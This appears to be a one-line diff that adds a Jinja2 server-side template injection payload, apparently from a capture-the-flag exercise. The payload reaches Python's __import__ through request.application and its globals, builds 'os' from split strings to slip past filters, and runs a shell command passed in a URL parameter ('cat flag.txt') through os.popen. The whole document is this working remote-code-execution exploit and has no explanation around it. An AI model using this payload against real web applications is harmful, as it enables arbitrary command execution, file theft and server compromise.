@@ -1,0 +1,1 @@
+{{request|attr(%27application%27)|attr(request.args.a)|attr(request.args.b)(request.args.c)|attr(request.args.b)(request.args.d)(%27o%27+%27s%27)|attr(%27popen%27)(request.args.cmd)|attr(%27read%27)()}}&a=__globals__&b=__getitem__&c=__builtins__&d=__import__&cmd=cat%20flag.txt
